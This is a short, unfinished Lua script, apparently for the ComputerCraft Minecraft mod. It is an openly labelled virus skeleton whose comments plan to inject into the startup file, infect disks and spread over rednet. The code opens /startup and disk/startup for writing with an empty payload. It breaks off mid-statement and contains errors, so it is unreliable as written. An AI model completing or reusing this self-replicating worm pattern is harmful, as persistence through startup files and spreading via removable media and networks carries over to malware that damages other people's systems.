-- Inject into startup.
-- Spread via rednet if possible
-- infect disks
-- maybe use _G.fs to offload files?
payload = ""
sides = {"left","right","back","top","bottom"}
if fs.exists("/startup") then
    vic = fs.open("/startup","a")
else
    vic = fs.open("/startup","w")
end
if fs.isDIr("disk") then
    if fs.exists("disk/startup") then
        vicDisk = fs.open("disk/startup","a")
    else
        vicDisk = fs.open("disk/startup","w")
    end
end
for i=1,#sides do
    if rednet.isOpen(sides[i])
        rednet.
